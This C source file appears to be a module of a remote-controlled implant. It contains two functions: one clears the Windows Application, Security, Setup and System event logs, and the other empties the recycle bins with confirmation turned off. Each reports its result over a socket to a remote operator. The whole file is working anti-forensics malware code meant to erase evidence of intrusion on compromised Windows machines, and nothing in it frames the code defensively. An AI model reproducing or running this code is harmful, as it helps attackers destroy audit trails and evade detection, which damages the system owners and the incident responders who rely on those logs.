#include "Variables.h"

int CleanLogsAPI()
{
	char Success[] = "\033[0;35m[+] Logs cleaned successfully!\033[0m\n";
	char Error[] = "\033[1;31m[-] Can't clean all logs.\033[0m\n";
	char NotAdmin[] = "\033[1;31m[-] You don't have admin privs.\033[0m\n";
	char Logs[4][16] = {"Application", "Security", "Setup", "System"};

	for (int i = 0; i < 4; i++)
	{
		HANDLE EventLog;
		EventLog = OpenEventLogA(NULL, Logs[i]);

		if (EventLog == NULL) //Something went wrong
		{
			if (i == 0) //If we didn't make it at the first try, then most likely we don't have admin privs
			{
				send(sock, NotAdmin, sizeof(NotAdmin), 0);
				return EXIT_FAILURE;
			}
			else
			{
				send(sock, Error, sizeof(Error), 0);
				return EXIT_FAILURE;
			}
		}

		int clear = ClearEventLogA(EventLog, NULL);
		if (clear == 0) //Something went wrong
		{
			send(sock, Error, sizeof(Error), 0);
			return EXIT_FAILURE;
		}

		int close = CloseEventLog(EventLog);
		if (close == 0) //Something went wrong
		{
			send(sock, Error, sizeof(Error), 0);
			return EXIT_FAILURE;
		}
	}

	send(sock, Success, sizeof(Success), 0);
	return EXIT_SUCCESS;
}

int CleanBins()
{
	char Success[] = "\033[0;35m[+] Cleaned bins!\033[0m\n";
	char Error[] = "\033[1;31m[-] Recycle bins are already empty\033[0m\n";

	HRESULT Cleaned;
	Cleaned = SHEmptyRecycleBinA(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
	if (Cleaned != S_OK)
	{
		send(sock, Error, sizeof(Error), 0);
		return EXIT_FAILURE;
	}

	send(sock, Success, sizeof(Success), 0);
	return EXIT_SUCCESS;
}
